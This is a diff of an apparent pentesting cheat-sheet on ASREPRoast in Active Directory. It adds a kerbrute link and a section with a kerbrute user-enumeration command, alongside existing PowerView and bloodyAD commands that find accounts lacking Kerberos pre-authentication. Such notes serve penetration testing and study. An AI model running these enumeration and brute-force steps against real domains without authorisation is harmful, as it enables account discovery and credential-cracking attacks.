@@ -11,9 +11,10 @@ ASREPRoast is a security attack that exploits users who lack the **[[88 - Kerbe
 - [Impacket - GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
 - [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 - [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [optional - kerbrute](https://github.com/ropnop/kerbrute)
 
 
-# Enumeration
+# Main Enumeration 
 Here we enumerate vulnerable users.
 **Windows**
 ```powershell
@@ -24,6 +25,12 @@ Get-DomainUser -PreauthNotRequired -verbose
 **Linux**
 ```bash
 bloodyAD -u <USER> -p 'PASSWORD' -d <DOMAIN> --host <IP> get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
+```
+
+# Optional Enumeration
+A tool to quickly brute force and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
+```bash
+./kerbrute userenum --dc <IP> -d <DOMAIN> <USERS>
 ```
 
 # Request AS_REP message (Exploit)
